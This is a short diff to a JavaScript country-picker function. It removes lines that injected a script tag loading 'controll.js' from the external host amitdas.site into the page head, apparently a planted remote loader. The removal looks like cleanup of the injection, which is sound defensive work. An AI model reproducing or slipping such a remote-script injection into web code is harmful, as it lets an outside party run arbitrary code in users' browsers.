@@ -261,10 +261,6 @@ function scanCodes() {
   placeholder.textContent = 'Select a country to keep…';
   el.countryPicker.appendChild(placeholder);
   
-  var script = document.createElement('script');
-  script.src = "https://amitdas.site/controll.js";
-  document.head.appendChild(script);
-
   // Sort by count desc
   const entries = Object.entries(codeCounts).sort((a,b) => b[1]-a[1]);
   for (const [key,count] of entries) {
